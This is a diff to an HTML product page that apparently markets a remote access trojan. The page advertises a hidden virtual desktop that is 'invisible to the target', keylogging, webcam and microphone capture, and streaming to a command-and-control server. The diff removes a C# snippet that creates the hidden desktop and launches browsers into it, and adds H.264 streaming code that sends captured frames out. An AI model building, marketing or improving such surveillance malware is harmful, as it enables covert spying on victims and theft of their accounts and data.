@@ -184,8 +184,9 @@
       <h3 data-i18n="dd.hvnc.h3">Hidden Virtual Network Computing</h3>
       <p data-i18n="dd.hvnc.p1">HVNC creates a completely isolated Windows desktop session — invisible to the target. Chrome, Edge, Firefox, Brave, Vivaldi, Opera, Opera GX, Telegram, Discord, AyuGram and Explorer launch directly into the shadow session. The victim sees nothing. You see everything.</p>
       <p><span data-i18n="dd.hvnc.p2a">Each browser gets </span><code>--start-maximized</code><span data-i18n="dd.hvnc.p2b"> and fills the HVNC frame. Mouse and keyboard forwarded with pixel-perfect accuracy. Clipboard synced on demand.</span></p>
+      <p data-i18n="dd.hvnc.p3">The stream is encoded in real time using the Windows Media Foundation H.264 MFT — no FFmpeg, no external codec. Frames are captured from the shadow desktop, converted BGRA→NV12 on the fly, and compressed to H.264 Baseline Annex-B with <code>MF_LOW_LATENCY</code> mode for near-zero encoder delay. Falls back to JPEG if MF is unavailable.</p>
       <div class="dd-tags">
-        <span data-i18n="dd.hvnc.tag1">isolated desktop</span><span data-i18n="dd.hvnc.tag2">11 apps</span><span data-i18n="dd.hvnc.tag3">clipboard sync</span><span data-i18n="dd.hvnc.tag4">real-time input</span>
+        <span data-i18n="dd.hvnc.tag1">isolated desktop</span><span data-i18n="dd.hvnc.tag2">11 apps</span><span data-i18n="dd.hvnc.tag3">H.264 stream</span><span data-i18n="dd.hvnc.tag4">clipboard sync</span><span data-i18n="dd.hvnc.tag5">real-time input</span>
       </div>
     </div>
     <div class="deepdive-card reveal">
@@ -202,6 +203,17 @@
     <div class="deepdive-card reveal">
       <div class="dd-icon">
         <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="1.6"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>
+      </div>
+      <h3 data-i18n="dd.rdp.h3">Remote Desktop — H.264 at 60 fps</h3>
+      <p data-i18n="dd.rdp.p1">Screen capture uses DXGI Desktop Duplication (<code>IDXGIOutput1::DuplicateOutput</code>) — GPU-direct, aligned to VBLANK for natural 60 fps pacing with no CPU copies. Falls back to GDI BitBlt on RDP sessions and headless machines.</p>
+      <p data-i18n="dd.rdp.p2">Captured BGRA frames are encoded via <strong>Windows Media Foundation's built-in H.264 MFT</strong> (<code>CLSID_CMSH264EncoderMFT</code>) — no FFmpeg, no third-party dependency. The pixel pipeline converts BGRA to NV12 (BT.601 limited range) in-place, then produces H.264 Baseline Annex-B NAL units with <code>MF_LOW_LATENCY=1</code> for minimal encoder delay. Bitrate scales automatically with resolution and FPS. On older or headless targets where MF is unavailable, the stream falls back to 64×64 JPEG block diff.</p>
+      <div class="dd-tags">
+        <span data-i18n="dd.rdp.tag1">DXGI + GDI fallback</span><span data-i18n="dd.rdp.tag2">H.264 Baseline</span><span data-i18n="dd.rdp.tag3">MF_LOW_LATENCY</span><span data-i18n="dd.rdp.tag4">no FFmpeg</span><span data-i18n="dd.rdp.tag5">NativeAOT COM</span>
+      </div>
+    </div>
+    <div class="deepdive-card reveal">
+      <div class="dd-icon">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#7c5ce8" stroke-width="1.6"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 21V9"/></svg>
       </div>
       <h3 data-i18n="dd.gui.h3">WPF Interface — DevExpress</h3>
       <p data-i18n="dd.gui.p1">Built on WPF with DevExpress 25.2. A persistent sidebar provides navigation — an icon rail on the left with labelled panels for each feature group. The entire UI adapts to the active theme in real time.</p>
@@ -222,8 +234,8 @@
       <div class="feat-col reveal">
         <h4 data-i18n="col.mon">Monitoring</h4>
         <ul>
-          <li data-i18n="feat.mon.1">Remote Desktop — DXGI + GDI fallback</li>
-          <li data-i18n="feat.mon.2">HVNC — isolated hidden desktop</li>
+          <li data-i18n="feat.mon.1">Remote Desktop — H.264 stream, DXGI capture, GDI fallback</li>
+          <li data-i18n="feat.mon.2">HVNC — isolated hidden desktop, H.264 stream</li>
           <li data-i18n="feat.mon.3">Webcam — DirectShow + VFW</li>
           <li data-i18n="feat.mon.4">Microphone — live listen + WAV save</li>
           <li data-i18n="feat.mon.5">Keylogger — disk logging by date</li>
@@ -341,27 +353,26 @@
     <div class="code-block reveal">
       <div class="code-header">
         <span class="cdot red"></span><span class="cdot yellow"></span><span class="cdot green"></span>
-        <span class="code-filename">HvncFeature.cs</span>
+        <span class="code-filename">H264Encoder.cs</span>
       </div>
-      <pre class="code-body"><code><span class="cm">// Create isolated shadow desktop — invisible to user</span>
-nint hvnc = CreateDesktop(<span class="num">"SeroHVNC"</span>,
-    <span class="num">0</span>, <span class="num">0</span>, <span class="num">0</span>, DESKTOP_ALL, <span class="num">0</span>);
+      <pre class="code-body"><code><span class="cm">// Windows MF H.264 MFT — no FFmpeg, NativeAOT COM vtable</span>
+CoCreateInstance(<span class="kw">ref</span> CLSID_CMSH264EncoderMFT,
+    <span class="num">0</span>, CLSCTX_INPROC_SERVER,
+    <span class="kw">ref</span> IID_IMFTransform, <span class="kw">out</span> _pTransform);
 
-<span class="cm">// Launch browser directly into hidden session</span>
-<span class="kw">var</span> si = <span class="kw">new</span> STARTUPINFOW {
-    cb          = (<span class="kw">uint</span>)Marshal.SizeOf&lt;STARTUPINFOW&gt;(),
-    lpDesktop   = <span class="num">"SeroHVNC"</span>,
-    dwFlags     = STARTF_USESHOWWINDOW,
-    wShowWindow = SW_SHOWMAXIMIZED
-};
-CreateProcessW(<span class="num">0</span>, <span class="kw">new</span> StringBuilder(browserCmd),
-    <span class="num">0</span>, <span class="num">0</span>, <span class="kw">false</span>, CREATE_UNICODE_ENVIRONMENT,
-    envBlock, <span class="num">0</span>, <span class="kw">ref</span> si, <span class="kw">out var</span> pi);
+<span class="cm">// MF_LOW_LATENCY: zero encoder buffer delay</span>
+Set32(pAttribs, MF_LOW_LATENCY, <span class="num">1</span>);
 
-<span class="cm">// Capture thread — stream JPEG frames to C2</span>
-SetThreadDesktop(hvnc);
-<span class="kw">while</span> (_running)
-    SendFrameAsync(CaptureDesktop(hvnc));</code></pre>
+<span class="cm">// Output: H.264 Baseline Annex-B</span>
+SetG(pOut, MF_MT_SUBTYPE, MFVideoFormat_H264);
+Set32(pOut, MF_MT_MPEG2_PROFILE, <span class="num">66</span>); <span class="cm">// Baseline</span>
+
+<span class="cm">// Input: NV12 (BGRA→NV12 BT.601 done in-stub)</span>
+SetG(pIn, MF_MT_SUBTYPE, MFVideoFormat_NV12);
+
+<span class="cm">// Encode frame → Annex-B NAL → base64 → TLS packet</span>
+<span class="kw">byte</span>[] nal = _h264Enc.Encode(bgraBits, stride);
+_send?.Invoke(PacketType.RdpH264Frame, ToJson(nal));</code></pre>
     </div>
   </div>
 </section>
